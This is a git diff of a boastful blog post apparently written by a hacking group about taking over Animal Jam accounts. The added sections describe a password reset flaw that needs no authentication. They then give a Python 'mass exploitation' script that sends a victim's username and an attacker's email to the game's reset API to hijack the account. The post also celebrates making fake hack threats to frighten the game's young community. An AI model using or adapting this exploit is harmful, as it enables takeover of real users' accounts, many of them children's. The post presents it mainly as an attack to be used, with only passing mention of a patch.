@@ -5,7 +5,7 @@ subtitle: "~ AKA, how we pwned Animal Jam ~"
 date: 2021-9-7
 author: chob
 tags: pentesting
-finished: false
+finished: true
 excerpt_separator: <!--more-->
 ---
 
@@ -21,6 +21,7 @@ This all started when one of our researchers (psuedo named "Moon") looked into A
 As you can see from the complilation above, they believed we had a apparent "ip logger" and other malicious items, this gave us a notorious reputation as this group of 40 year olds in their mothers basement that are very **1337**, which was not the case. From there, we wanted to test how much the community and the company WildWorks was afraid of apparent fake threats. So around October 2020, we made a threat that we were going to "hack" Animal Jam on halloween, the community freaked and made a bunch of YouTube videos with WildWorks putting their servers on lockdown. It was the biggest lawl for us. <br>
 
 Now that you understand the context before the main pwn; without further ado, let's get into the main pwn. On August 16, 2021, we discovered a 0day **no-auth** full account takeover on Animal Jam. How? simple. A fucking password reset endpoint. Let me repeat that, a fucking **password reset endpoint**, someone must've been some crack while writing the endpoint lol (╯°□°）╯︵ ┻━┻.
+
 ***
 # Discovering the vulnerability
 Basically, one of our researchers used Fiddler to capture all the traffic coming from the Animal Jam application because he was capturing all the traffic he managed to come across the `/disable` endpoint. Every account on Animal Jam is linked to a certain "parent account", and since he got the endpoint for `/disable` he was able to look at the post data (the data that is sent with the post request) he noticed on the post data you were able to send a custom email in the post data so he replaced the email, not expecting anything until.. he recieved a email from Animal Jam and funny enough, once he clicked on the disable account link, it automatically overrided the email that is already linked to the account with the custom email you put in.
@@ -31,3 +32,42 @@ Only issue with this is that it didn't disable the player, but knowing it did li
 
 <a href="/img/Electric-Boogaloo:-Hacking-Animal-Jam/meme.jpg" target="_blank"><img class="centerImgLarge" src="/img/Electric-Boogaloo:-Hacking-Animal-Jam/meme.jpg"></a>
 ***
+
+# Mass Exploitation
+Now we know the vulnerability, how do we use it on a large scale attack? Simple! All we need to do is write a script to send a post request with the post data and the target with a burner email.
+
+### - Writing the exploit using python3
+Lets start by making a Python script and then importing the request library for sending the post request and sys for argument handling and then supplying the endpoint with the request:
+```python
+import requests
+import sys
+
+class Exploit:
+
+    def __init__(self, username, email):
+        self.username = username
+        self.email = email
+
+    def execute(self):
+        endpoint = f'https://api.animaljam.com/game_account/{username}/send_password_reset/desktop'
+        return requests.post(url=endpoint, data={'email': email, 'user_name': username}, headers={'auth': 'null'})
+
+def main():
+    if len(sys.argv) < 3:
+        print(f'Usage: py {sys.argv[0]} <USERNAME> <YOUR_EMAIL>')
+        sys.exit()
+
+    username = sys.argv[1]
+    email = sys.argv[2]
+
+    Exploit(username, email).execute()
+
+if __name__ == '__main__':
+    main()
+```
+and **PWNED**! Now you can takeover anyones account just by supplying the username and a burner email lol.
+<a href="/img/Electric-Boogaloo:-Hacking-Animal-Jam/ez.jpg" target="_blank"><img class="centerImgLarge" src="/img/Electric-Boogaloo:-Hacking-Animal-Jam/ez.jpg"></a>
+Although it was patched due to the security advisory we released the next day because Animal Jam was having some issues making a patch lol, but here's a gif & a image of us on the AJHQ account on the parents dashboard using this exploit.
+
+<a href="/img/Electric-Boogaloo:-Hacking-Animal-Jam/ajhq.gif" target="_blank"><img class="centerImgSmall" src="/img/Electric-Boogaloo:-Hacking-Animal-Jam/ajhq.gif"></a>
+<a href="/img/Electric-Boogaloo:-Hacking-Animal-Jam/ajhq.jpg" target="_blank"><img class="centerImgLarge" src="/img/Electric-Boogaloo:-Hacking-Animal-Jam/ajhq.jpg"></a>
